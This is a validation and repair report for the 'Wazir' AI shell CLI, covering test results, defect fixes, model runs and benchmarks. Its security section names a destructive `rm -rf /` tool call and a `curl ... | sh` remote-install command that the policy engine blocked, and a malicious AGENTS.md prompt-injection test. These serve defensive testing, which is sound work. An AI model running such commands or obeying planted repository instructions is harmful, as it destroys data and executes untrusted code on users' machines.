# Wazir Shell End-to-End Validation and Repair — Final Report

- **Repository:** `/Users/wael/Code/Wazir` (branch `feat/wazir-shell-e2e-repair`, branched from baseline commit `a96507f5ca5fa16e2a181188661eddc18bba01b0`)
- **CLI Version Verified:** `v0.4.0` (`apps/cli/dist/index.js` and standalone `bin/wa.js`)
- **Report Date:** `2026-11-21`
- **Validation Harness:** [`tests/shell-validation/run-validation.mjs`](../run-validation.mjs)
- **Overall Result:** **36 / 36** end-to-end validation checks PASSED (`0` failures, `0` blocked); **6 / 6** Vitest regression test files (**71 / 71** unit & integration tests) PASSED; `npm run check-dist` PASSED; `@wazir/core` and `@wazir/agents` typechecks PASSED (exit `0`), while repo-wide `npm run typecheck` failed (`exit 2`) solely on an unrelated concurrent untracked file (`apps/cli/src/tui/admissibleHardwareComputers.ts:17:11`, zero errors in `shellCommand.ts`).

---

## 1. Baseline Environment & Findings

- **macOS Host (`WaelMacPro.local`):** macOS `27.0.1 (Build 26A434)`, Darwin `27.0.0 arm64`, Node.js `v22.23.3`, `/bin/zsh`, `sandbox-exec`, `24 GiB` RAM (`0.1–0.3 GiB` free OS memory at check time), `os-keychain` (`@napi-rs/keyring`), native `node-pty`, `rg`, Cargo/Rustc (`/opt/homebrew/bin/cargo`).
- **Linux Fleet Node (`dgx` / `waelbot` / `dgx_spark`):** Ubuntu `24.04.5 LTS`, Linux `7.0.0-1024-nvidia aarch64`, Node.js `v22.22.3`, GNU Bash `5.2.21(1)`, Python `3` (`pty`), `/usr/bin/bwrap`, `128.0 GiB` unified memory, Ollama (`qwen3-coder:30b`, `gemma4:26b`, `qwen3.6:35b-a3b-q8_0`, `qwen3.8:27b`, `qwen2.5vl:72b`, `muse-glimmer:latest`).
- **Secondary Mac Node (`mac_studio`):** Apple M4 Max (`36.0 GiB`) running `mac_studio:lmstudio` (`qwen/qwen3-30b-a3b` initially loaded) — went offline on the LAN partway through validation, after which tests dynamically targeted `dgx_spark:ollama` (`qwen3-coder:30b` & `gemma4:26b`).
- **Hosted Provider:** NVIDIA API Catalog (`api-key`, 35 models registered); default `localOnly` privacy policy correctly prevented unapproved hosted calls unless explicitly authorized.
- **Baseline Diagnostics (`wa doctor`):** 17 passed, 2 warnings (models unloaded on `dgx_spark:ollama` and prompt-cache telemetry unavailable on Ollama/LM Studio).
- **Important Version Observation:** Prompt notes referenced `v0.3.2`, while the checked-out repository (`package.json`) and built CLI runtime report authoritatively as **`v0.4.0`**.

---

## 2. Test Matrix Summary

Full CSV ledger: [`tests/shell-validation/test-matrix.csv`](../test-matrix.csv)

| Group | Range | Total | PASS | FAIL | BLOCKED | Notes |
|---|---|---:|---:|---:|---:|---|
| Native Shell | `S01`–`S15` | 15 | 15 | 0 | 0 | Real `zsh` execution, pipes, quoting, redirects, exit 42, `node-pty` TAB/Ctrl+C/child readline |
| AI Execution | `A01`–`A07` | 7 | 7 | 0 | 0 | Live fleet Qwen & Gemma 4 execution, real TS fix + `node --test`, error/offline checks |
| Mixed-Mode Routing | `M01`–`M02` | 2 | 2 | 0 | 0 | 6-step persistent session + ambiguous classification matrix |
| Security & Permissions | `SEC01`–`SEC08` | 8 | 8 | 0 | 0 | `--permissions read-only`, `/permissions ask` denial, injection blocks, `AGENTS.md`, secrets, orphans, `OUTCOME_UNKNOWN` |
| Platform Compatibility | `COMPAT-MAC-01`, `COMPAT-MAC-02`, `COMPAT-LIN-01` | 3 | 3 | 0 | 0 | macOS PTY/UTF-8/`cargo check` + live Linux Ubuntu 24.04 `aarch64` bundle & Python `pty` |
| Performance Benchmarks | `PERF-BENCH` | 1 | 1 | 0 | 0 | 8 real measured metrics including `wa exec` comparison |
| **Total** | | **36** | **36** | **0** | **0** | All checks run cleanly after final edits |

---

## 3. Defects Found & Fixes Applied

Full 11-column defect ledger: [`tests/shell-validation/defects.csv`](../defects.csv)

- **`DEF-001` (P0 — AI Execution & Permission Controls):** Added `createShellAiHandler`, `attachShellPermissionPolicy`, `--model` / `--permissions` CLI options, `/model` and `/permissions` directives, loaded-instance fallback (`engine.lifecycle.list()`), provenance output, and result/error printing in `apps/cli/src/commands/shellCommand.ts` and `packages/core/src/services/shellClassifier.ts`.
- **`DEF-002` (P1 — Classifier Disambiguation):** Expanded `NATURAL_LANGUAGE_FOLLOWERS` and added `looksLikeFindNaturalLanguage` in `shellClassifier.ts` so `find broken tests` / `fix failing tests` route to `ai` while `find . -name '*.ts'` routes to `shell`.
- **`DEF-003` (P1 — Signal & Process Tree Cleanup):** Added `terminateChildProcessTree` (`pgrep -P` BFS descendant traversal + `terminateProcessTree` escalation) and timer cleanup on exit/error in `shellCommand.ts`.
- **`DEF-004` (P1 — Tab Completion):** Extracted and exported `completeShellInput(line, state)` in `shellCommand.ts` completing Wazir commands, builtins, `/` directives, aliases, and relative/absolute paths from `state.cwd`.
- **`DEF-005` (P1 — Builtin `$VAR` / `${VAR}` Expansion):** Exported `expandShellEnv` and wired it into builtin `cd`, `export`, and bare `VAR=VAL` assignments in `shellCommand.ts`.
- **`DEF-006` (P1 — Non-Mutating OS/Lookup Queries Failed Verification):** Updated `isCheckOrInspect` in `packages/core/src/services/planner.ts` so informational questions (`What operating system am I running?`, `Find the relevant code...`) do not require `mutationRequired: true`.
- **`DEF-007` (P1 — Tool Stripping on Informational Queries):** Added OS/environment terms to `WORKSPACE_OR_TOOL_ACTION_RE` in `packages/agents/src/legacyCodingAgent.ts` and explicitly pinned `agent: 'wazir-coding'` in `createShellAiHandler`.
- **`DEF-008` (P1 — Interactive Child PTY Stdin Contention):** Replaced single raw-mode `readline` loop in `launchInteractiveWazirShell` with per-line readline lifecycle (`rl.close()` + `setRawMode(false)` before spawning children, process-level `SIGINT` forwarding, `stdin.resume()` and prompt recreation afterward).
- **`DEF-009` (P1 — Non-TTY Test Runner Policy Poisoning in `auto` Mode):** Guided models toward dedicated `test`/`build`/`lint`/`typecheck` tools in `packages/agents/src/qwenCore/systemPrompt.ts` and permitted metacharacter-free `SAFE_AUTO_TEST_COMMAND_RE` test commands (inside `projectRoot`) under `permissionMode === 'auto'`.
- **`DEF-010` (P1 — Ollama Bare `<function=...></function></tool_call>` XML Fallback Missed):** Updated `packages/agents/src/qwenCore/xmlToolFallback.ts` and removed the restrictive `content.includes('<tool_call>')` guard at `packages/agents/src/qwenCore/turn.ts:143`.

---

## 4. Native Shell Validation Results (`S01`–`S15`)

- All 15 cases passed (`277ms`–`743ms` per spawned CLI check).
- Verified exact stdout/stderr, pipes (`printf 'a\nb\n' | grep b` -> `b`), exit codes (`42`, nonexistent-file `1`), whitespace-preserving quoting (`["arg one","two spaces"]`), file redirection, `cd` / `cd -` persistence, `export` `$VAR` expansion & `unset`, `history` persistence across sessions, live `node-pty` TAB completion (`s14-tab-history-pty.txt`), `node-pty` `Ctrl+C` interruption of `sleep 10` (`s07-pty-sigint.txt`, 0 orphans), and live child `readline` stdin/stdout roundtrip (`s15-interactive-pty.txt`: `ENTER_NAME:` -> `WAZIR_USER` -> `GREET:WAZIR_USER` -> restored prompt).

---

## 5. AI Execution Validation Results (`A01`–`A07`)

Recorded JSONL telemetry: [`tests/shell-validation/executions.jsonl`](../executions.jsonl)

- **`A01` (`exec-mwqypf33-1`, 24,107ms):** `qwen3-coder:30b` on `dgx_spark:ollama` inspected host via `shell`, reported `macOS (Darwin)` / `Kernel Version: 27.0.0` / `arm64`, 0 user files created.
- **`A02` (`exec-mwqypxpr-1`, 61,638ms):** Cited real `@wazir/*` workspace packages on `/Users/wael/Code/Wazir` with unchanged `git status`.
- **`A03` (`exec-mwqyr9fx-1`, 71,474ms):** Created `add.ts` + `add.test.ts`, passed Wazir's `build`, `test`, `lint`, `typecheck`, and independently passed `node --experimental-strip-types --import ./.ts-loader.mjs --test` (1 test, 0 fail).
- **`A04` (`exec-mwqyssl8-1`, 29,775ms):** Identified deliberate `a - b` bug in `math.ts`, repaired to `a + b`, passed checks and independent `node --experimental-strip-types --test math.test.ts` (1 test, 0 fail).
- **`A05` (`exec-mwqytfgh-1` 13,210ms & `exec-mwqytps9-1` 22,310ms):** Routed identical math prompt across `qwen3-coder:30b` (`dgx_spark:ollama`) and `gemma4:26b` (`dgx_spark:ollama`), recording distinct provenance lines and returning `42` for both. Note: earlier in pre-offline run, `qwen/qwen3-30b-a3b` (`mac_studio:lmstudio`) and `qwen3.6:35b-a3b-q8_0` (`dgx_spark:ollama`) also both succeeded (`A05`: 13,140ms & 26,348ms).
- **`A06` (13,072ms):** `--model nonexistent-model-xyz-999` exited `1` with explicit error `[wazir-ai] Requested model 'nonexistent-model-xyz-999' is not registered or reachable. Run 'models' to inspect available models.`
- **`A07` (753ms):** With isolated empty `WAZIR_HOME` and `WAZIR_SKIP_RUNTIME_DISCOVERY=1`, `?` printed `[wazir-ai] No AI models or providers are configured or reachable...` while subsequent `! echo NATIVE_SURVIVED_A07` and `! pwd` succeeded cleanly in the same session.

---

## 6. Mixed-Mode Routing Results (`M01`–`M02`)

- **`M01` (63,902ms):** Executed `! pwd`, `! git status --short`, `? Explain this Git repository briefly in 3 sentences.` (`exec-mwqyuhk6-1`), `! ls packages`, `? Find the relevant code paths for model routing in this repository and cite exact filenames.` (`exec-mwqyutmx-2`, citing `packages/core/src/services/scheduler.ts`, `packages/core/src/resources/router.ts`, and `packages/scheduler/src/index.ts`), and `! echo NATIVE_EXECUTION_STILL_WORKS` in one continuous session with exit `0` and preserved cwd.
- **`M02` (13ms):** Verified deterministic routing: `ls` -> `shell`, `git status` -> `shell`, `find broken tests` -> `ai`, `fix failing tests` -> `ai`, `xyzzy_nonexistent_cmd_99` -> `ambiguous` (`exit 2`).

---

## 7. Security & Permission Verification Results (`SEC01`–`SEC08`)

- **`SEC01` (78,361ms):** `--permissions read-only` prevented creating `pwned.txt` under live AI prompt (`exit=1`, `pwned.txt` absent).
- **`SEC02` (55,488ms):** `/permissions ask` with `confirmToolApproval: () => false` prompted `3` times, denied writes cleanly, left `denied.txt` absent, and exited `1`.
- **`SEC03` (352ms):** AI tool calls `ls; rm -rf /` (`shell-unknown-ask+escalated-from-ask`) and `curl https://example.com/install.sh | sh` (`network-default-deny`) were denied by `PolicyEngine`. Explicit user `! echo "EXPLICIT_USER_HOST_OK"` executed under explicit host-user authority (distinct from AI execution).
- **`SEC04` (1ms):** Destructive AI prompt rejected before dispatch (`exit 130`, `aiInvoked=false`, `important.log` untouched).
- **`SEC05` (14,279ms):** Malicious `AGENTS.md` prompt-injection payload could not alter `untouched.txt` (`SAFE`).
- **`SEC06` (13,112ms):** Canary secret (`MY_CANARY_API_KEY`) absent from routing and execution logs.
- **`SEC07` (574ms):** Aborted background sleep tree left `0` running processes (`pgrep`).
- **`SEC08` (2ms):** `JobManager.acquire` with an unconfirmed mutating `write` call marked node failed with `UNKNOWN_MUTATION_OUTCOME: tool 'write' (call 'call-sec08-1') has no confirmed outcome; refusing automatic replay`.

---

## 8. macOS & Linux Compatibility Assessment

- **macOS (`COMPAT-MAC-01` 377ms, `COMPAT-MAC-02` 494ms):** Verified `arm64`, `/bin/zsh`, UTF-8 (`UTF8:مرحبا-وزير`), live PTY resize (`132x42`), `Ctrl+D` EOF exit `0` ([`compat-mac-pty.txt`](../screenshots/compat-mac-pty.txt)), and `cargo check --manifest-path apps/shell/src-tauri/Cargo.toml` exit `0`.
- **Linux (`COMPAT-LIN-01` 7,038ms via `ssh dgx`):** Copied compiled `bin/wa.js` bundle to Ubuntu `24.04.5 LTS` (`aarch64`, GNU Bash `5.2.21`) and verified `! uname -s` (`Linux`), `export` + `$LV` expansion (`linux_ok/dir`), pipelines (`printf ... | grep y` -> `y`), exact exit code `42`, and Python `pty` (`TIOCSCTTY`) `Ctrl+C` interruption + child `readline` stdin (`ask.cjs` -> `DGX_OK` -> clean prompt return) ([`compat-linux-dgx-pty.txt`](../screenshots/compat-linux-dgx-pty.txt)).

---

## 9. Performance Benchmark Results

Full metrics CSV: [`tests/shell-validation/performance.csv`](../performance.csv)

| Metric | Median | P95 | Max | Raw Samples |
|---|---:|---:|---:|---|
| Cold startup (`wa shell --no-ai -c '! true'`) | 292 ms | 300 ms | 300 ms | `[290, 292, 300]` |
| Warm in-session native command (`! echo ...`) | 3 ms | 5 ms | 5 ms | `[3, 3, 3, 3, 5]` |
| AI first stdout byte (`wa shell -c '? Respond...'`) | 282 ms | 282 ms | 282 ms | `[282]` |
| AI cold end-to-end (`wa shell --model qwen3-coder:30b`) | 13,124 ms | 13,124 ms | 13,124 ms | `[13124]` |
| Baseline comparison (`wa exec --model qwen3-coder:30b --type chat`) | 11,469 ms | 11,469 ms | 11,469 ms | `[11469]` |
| Interactive shell RSS memory (`ps -o rss=`) | 155.8 MiB | 155.8 MiB | 155.8 MiB | `[155.8]` |
| Interactive shell CPU% during idle probe | 36 % | 36 % | 36 % | `[36]` |
| `SIGINT` child cancellation latency (`! sleep 10`) | 27 ms | 29 ms | 29 ms | `[26, 27, 29]` |

*(Note: interactive shell CPU% at `600ms` post-spawn reflects JIT/module load tail right after Node startup rather than long-term quiescent idle CPU; `wa chat` opens interactive TUI and was compared via headless `wa exec --type chat` on the same engine/model path.)*

---

## 10. Remaining Known Limitations, Environment Constraints & Caveats

1. **Linux Ubuntu 24.04 AppArmor `bwrap` Restriction:** Probing `bwrap --ro-bind / / /bin/true` on `dgx` fails with `bwrap: setting up uid map: Permission denied` due to Ubuntu 24.04 unprivileged user namespace AppArmor policy. Linux deployments requiring OS sandbox isolation need an AppArmor `bwrap` profile or configured container/runtime boundary.
2. **Local Laptop Free RAM vs Remote Fleet:** `WaelMacPro.local` had `0.1–0.3 GiB` free OS memory during testing, so local LM Studio/MLX models could hit `MODEL_ADMISSION_DENIED` unless unloaded or offloaded to `dgx_spark` (`128 GiB`) or `mac_studio`.
3. **Explicit User `!` Host Authority Trust Boundary:** Inputs prefixed with `!` (or classified as explicit user OS commands) execute directly in the user's host `zsh`/`bash` with host-user privileges by design; `PolicyEngine` governs AI-initiated tool execution (`?`, NL AI prompts, workflows), not manual user shell typing.
4. **LLM Behavioral Variance (`M01` Q1 & `A03` Fixture Conventions):** In `M01` turn 1 (`exec-mwqyuhk6-1`), `qwen3-coder:30b` produced a generic refusal phrasing even though prompt 2 (`exec-mwqyutmx-2`) in the same session inspected repo files and cited exact paths; in `A03`, an `AGENTS.md` + `.ts-loader.mjs` convention was provided in the temp fixture so Node v22 strip-types resolved relative imports cleanly without the model guessing `deno test`.
5. **Unrelated Concurrent Dirty Files in Checkout:** Unrelated concurrent/pre-existing changes (`apps/cli/src/tui/fleetTui.ts`, `admissibleHardwareComputers*`, `localUtilityAnswers*`, `fastOrchestrator*`, etc.) exist in the working tree outside this branch commit scope; `apps/cli/src/tui/admissibleHardwareComputers.ts:17:11` causes `apps/cli` / repo-wide `npm run typecheck` to exit `2`, while all modified `@wazir/core`, `@wazir/agents`, and `shellCommand.ts` code compiles cleanly and was left isolated from commit staging.

---

## 11. Final Go / No-Go Verdict

**CONDITIONAL GO** for `wazir` / `wa shell` CLI & PTY runtime (`v0.4.0`) on macOS (`zsh`, `arm64`) and Linux (`bash`, `aarch64`):
- All P0 and P1 shell routing, AI execution, permission (`ask`/`auto`/`read-only`), XML tool fallback, Tab completion, `$VAR` builtin expansion, interactive child PTY handoff, and `SIGINT` descendant cleanup defects identified during E2E testing are fixed and verified (`36 / 36` validation checks PASS, `71 / 71` Vitest tests PASS, clean `check-dist`, and zero type errors across all modified files — repo-wide `npm run typecheck` exits `2` only on unrelated concurrent `apps/cli/src/tui/admissibleHardwareComputers.ts:17:11`).
- Conditions for production rollout: configure Ubuntu AppArmor profiles where `bwrap` sandboxing is mandated on Linux hosts, ensure fleet/local model memory availability (`dgx_spark` / `mac_studio` / authorized hosted keys), and keep `eval` integrity rules strict.
